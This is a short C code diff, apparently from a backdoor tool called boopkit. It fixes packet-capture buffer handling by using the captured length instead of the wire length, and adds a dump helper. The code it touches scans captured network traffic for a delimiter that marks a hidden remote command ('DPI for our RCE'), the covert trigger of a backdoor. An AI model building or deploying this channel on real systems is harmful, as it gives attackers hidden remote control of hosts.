@@ -76,19 +76,24 @@ int rce_filter(char *raw, char *rce){
   return 0;
 }
 
+void xpack_dump(xcap_ip_packet *xpack) {
+  boopprintf("  -> Dumping Raw Xpack:\n");
+  unsigned char *packet = xpack->packet;
+  for (int j = 0; j < xpack->header->caplen; j++){
+    boopprintf("%c", packet[j]);
+  }
+  boopprintf("\n");
+}
+
 void snapshot_dump(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]){
   boopprintf("  -> Dumping Raw Snapshot:\n");
   for(int i = 0; i < XCAP_BUFFER_SIZE; i++) {
     struct xcap_ip_packet *xpack;
     xpack = snap[i];
-    if (!xpack->captured) {
+    if (!xpack->captured || xpack->header->caplen < 1) {
       continue;
     }
-    unsigned char *packet = xpack->packet;
-    for (int j = 0; j < xpack->header->len; j++){
-      boopprintf("%c", packet[j]);
-    }
-    boopprintf("\n");
+    xpack_dump(xpack); // printf
   }
 }
 
@@ -228,8 +233,8 @@ int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
     struct xcap_ip_packet *to = malloc(sizeof (xcap_ip_packet));
 
     // packet
-    to->packet = malloc(from->header->len);
-    memcpy(to->packet, from->packet, from->header->len);
+    to->packet = malloc(from->header->caplen);
+    memcpy(to->packet, from->packet, from->header->caplen);
 
     // iph
     struct in_addr src_in = from->iph->ip_src;
@@ -270,12 +275,13 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
     unsigned char *packet = xpack->packet;
     // DPI for our RCE
     char *rce_sub;
-    rce_sub = memmem(packet, xpack->header->len, BOOPKIT_RCE_DELIMITER, strlen(BOOPKIT_RCE_DELIMITER));
+    rce_sub = memmem(packet, xpack->header->caplen, BOOPKIT_RCE_DELIMITER, strlen(BOOPKIT_RCE_DELIMITER));
     if (rce_sub != NULL) {
       boopprintf("  -> Found RCE xCap!\n");
       int found;
       found = rce_filter(rce_sub, rce);
       if (found){
+        xpack_dump(xpack);
         snapshot_free(snap);
         return 0; // Money, Success, Fame, Glamour
       }else {
